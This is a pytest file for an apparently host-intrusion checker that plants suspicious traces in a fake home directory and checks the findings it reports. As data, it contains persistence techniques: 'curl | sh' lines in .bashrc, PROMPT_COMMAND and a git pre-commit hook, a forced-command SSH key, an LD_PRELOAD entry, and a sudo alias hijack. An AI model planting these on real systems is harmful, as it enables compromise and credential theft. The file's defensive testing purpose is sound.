"""Watchpost checks: each planted trace must produce a finding with the
right severity, and a clean artificial HOME must produce none.

Everything here runs against a fake HOME under tmp_path. The real home
is never read -- the check entry points take the home as an argument.
"""
from __future__ import annotations

import os
import stat
from pathlib import Path

from delfin.watchpost.checks import (
    check_ssh,
    check_persistence,
    check_user_binaries,
    check_credentials,
    check_delfin_audit,
    check_git,
    parse_last_output,
    parse_ss_output,
)
from delfin.watchpost.model import Finding

KEY_A = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHHh first@host\n"
KEY_B = 'command="/tmp/.x/beacon",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAOther second@host\n'


def _ssh_dir(home: Path) -> Path:
    d = home / ".ssh"
    d.mkdir(mode=0o700)
    return d


def _write(path: Path, text: str, mode: int = 0o600) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    path.chmod(mode)
    return path


def severities(findings: list[Finding], check: str) -> list[str]:
    return [f.severity for f in findings if f.check == check]


# --- SSH -----------------------------------------------------------------

def test_second_key_with_command_option_is_an_alert(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    ak = _write(_ssh_dir(home) / "authorized_keys", KEY_A + KEY_B)
    findings = check_ssh(home)
    hits = [f for f in findings if "authorized_keys" in f.path]
    assert hits, "the command= key must be reported"
    assert any(f.severity == "alert" and "command" in f.what.lower() for f in hits)
    assert ak in [Path(f.path) for f in findings]


def test_duplicate_keys_are_reported(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(_ssh_dir(home) / "authorized_keys", KEY_A + KEY_A)
    findings = check_ssh(home)
    assert any("duplicate" in f.what.lower() for f in findings)


def test_clean_ssh_leaves_no_finding(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(_ssh_dir(home) / "authorized_keys", KEY_A)
    assert check_ssh(home) == []


def test_ssh_config_proxycommand_is_an_alert(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(_ssh_dir(home) / "config",
           "Host odd\n  ProxyCommand /tmp/.x/wrap %%h %%p\n")
    findings = check_ssh(home)
    assert any(f.severity == "alert" and "proxycommand" in f.what.lower()
               for f in findings)


def test_too_open_private_key_is_a_warning(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(_ssh_dir(home) / "id_ed25519", "-----BEGIN OPENSSH PRIVATE KEY-----\n",
           mode=0o644)
    findings = check_ssh(home)
    assert any(f.severity == "warn" and "id_ed25519" in f.path
               for f in findings)


# --- persistence ---------------------------------------------------------

def test_curl_pipe_sh_in_bashrc_is_an_alert(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    rc = _write(home / ".bashrc", "PS1='\\u@\\h\\w '\ncurl -s http://x/y | sh\n")
    findings = check_persistence(home)
    hits = [f for f in findings if f.path == str(rc)]
    assert hits and hits[0].severity == "alert"
    assert hits[0].line == 2


def test_prompt_command_hook_is_reported(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(home / ".bashrc", "PROMPT_COMMAND='curl -s x | sh'\n")
    findings = check_persistence(home)
    assert any("prompt_command" in f.what.lower() for f in findings)


def test_alias_sudo_is_reported(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(home / ".zshrc", "alias sudo=/tmp/.x/s\n")
    findings = check_persistence(home)
    assert any("alias" in f.what.lower() for f in findings)


def test_innocent_rc_leaves_no_finding(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(home / ".bashrc", "export EDITOR=vim\nalias ll='ls -l'\n")
    _write(home / ".profile", "PATH=$HOME/bin:$PATH\n")
    assert check_persistence(home) == []


def test_ssh_environment_is_reported(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(_ssh_dir(home) / "environment", "LD_PRELOAD=/tmp/.x.so\n")
    findings = check_persistence(home)
    assert any("ld_preload" in f.what.lower() for f in findings)


# --- ~/.local/bin / ~/bin ------------------------------------------------

def test_new_suid_binary_in_local_bin(tmp_path):
    home = tmp_path / "home"
    (home / ".local" / "bin").mkdir(parents=True)
    exe = home / ".local" / "bin" / "helper"
    exe.write_text("#!/bin/sh\n")
    exe.chmod(0o4755)
    findings = check_user_binaries(home, baseline_names=set())
    assert any(f.severity == "alert" and "suid" in f.what.lower()
               for f in findings)


def test_known_binary_is_not_new_against_baseline(tmp_path):
    home = tmp_path / "home"
    d = home / ".local" / "bin"
    d.mkdir(parents=True)
    exe = d / "helper"
    exe.write_text("#!/bin/sh\n")
    exe.chmod(0o755)
    findings = check_user_binaries(home, baseline_names={"helper"})
    assert findings == []


# --- credentials ---------------------------------------------------------

def test_world_readable_netrc_is_a_warning(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(home / ".netrc", "machine x login y password z\n", mode=0o644)
    findings = check_credentials(home)
    assert any(f.severity == "warn" and ".netrc" in f.path for f in findings)


def test_history_hit_counts_without_the_value(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    _write(home / ".bash_history",
           "ls\nexport AWS_ACCESS_KEY_ID=AKIA1234567890EXAMPLE\n")
    findings = check_credentials(home)
    hits = [f for f in findings if "history" in f.path]
    assert hits and hits[0].severity == "alert"
    assert "AKIA1234567890EXAMPLE" not in hits[0].what
    assert "AKIA1234567890EXAMPLE" not in hits[0].why


# --- git -----------------------------------------------------------------

def test_new_hook_is_an_alert(tmp_path):
    repo = tmp_path / "repo"
    hooks = repo / ".git" / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "pre-commit").write_text("#!/bin/sh\ncurl x | sh\n")
    (hooks / "pre-commit").chmod(0o755)
    (hooks / "post-merge").write_text("#!/bin/sh\n")
    findings = check_git([repo], baseline_hooks=set())
    assert any(f.severity == "alert" and "pre-commit" in f.path for f in findings)


# --- DELFIN audit --------------------------------------------------------

def test_pile_of_denials_in_audit_log(tmp_path):
    home = tmp_path / "home"
    audit = home / ".delfin"
    audit.mkdir(parents=True)
    lines = "\n".join(
        f'{{"ts": {i}, "event": "denied", "path": "/etc/{i}"}}'
        for i in range(25))
    (audit / "audit-2026.log").write_text(lines + "\n")
    findings = check_delfin_audit(home)
    assert any(f.severity == "warn" and "denied" in f.what.lower()
               for f in findings)


# --- logins / network parsers -------------------------------------------

def test_unparseable_last_is_reported_as_not_checkable():
    findings = parse_last_output(None)
    assert findings and findings[0].severity == "info"
    assert "not checkable" in findings[0].what.lower()


def test_unusual_hour_login_is_a_warning():
    text = ("user pts/0 10.0.0.9 Tue Sep 23 03:12 - 03:30 (00:18)\n"
            "user pts/1 10.0.0.9 Tue Sep 23 14:00 - 14:05 (00:05)\n")
    findings = parse_last_output(text)
    assert any(f.severity == "warn" and "03" in f.what for f in findings)


def test_ss_listener_and_odd_port():
    text = ("LISTEN 0 128 0.0.0.0:4444 users:((\"beacon\",pid=9,fd=3))\n"
            "ESTAB 0 0 10.0.0.9:443 9.9.9.9:443 users:((\"ok\",pid=8,fd=4))\n")
    findings = parse_ss_output(text, baseline_hosts=set())
    assert any(f.severity == "alert" and "4444" in f.what for f in findings)
    assert any(f.severity == "warn" and "LISTEN" in f.what.upper() for f in findings)
